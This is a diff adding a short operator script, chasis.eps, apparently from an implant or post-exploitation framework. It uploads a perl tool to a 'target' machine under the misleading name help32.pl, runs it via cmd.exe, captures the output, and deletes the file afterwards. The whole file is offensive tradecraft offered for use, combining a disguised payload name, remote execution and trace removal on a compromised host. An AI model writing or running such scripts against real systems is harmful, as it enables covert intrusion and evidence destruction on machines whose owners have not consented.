@@ -1,0 +1,37 @@
+#--------------------------------------------------------
+# File: chasis.eps
+#--------------------------------------------------------
+
+@include "_GenericFunctions.epm";
+@include "_FileExists.epm";
+
+@echo off;
+
+string $tempDir;
+string $toolsDir;
+string $inputLines;
+string $line;
+int $counter;
+
+if (prompt "Run chassis.pl on target (uploaded as help32.pl)?") {
+
+	_GetEPToolsPath($toolsDir);
+
+	ifnot (_FileExists("help32.pl")) {
+		`put "$toolsDir\\chasis.pl" -name help32.pl`;
+	} else {
+		echo "help32.pl already exists on target";
+		return false;
+	}
+
+	echo "";
+	@echo on;
+	`run -command "cmd.exe /c help32.pl" -redirect chasis`;
+	@echo off;
+
+	sleep 3000;
+
+	`del help32.pl`;
+}
+
+return true;
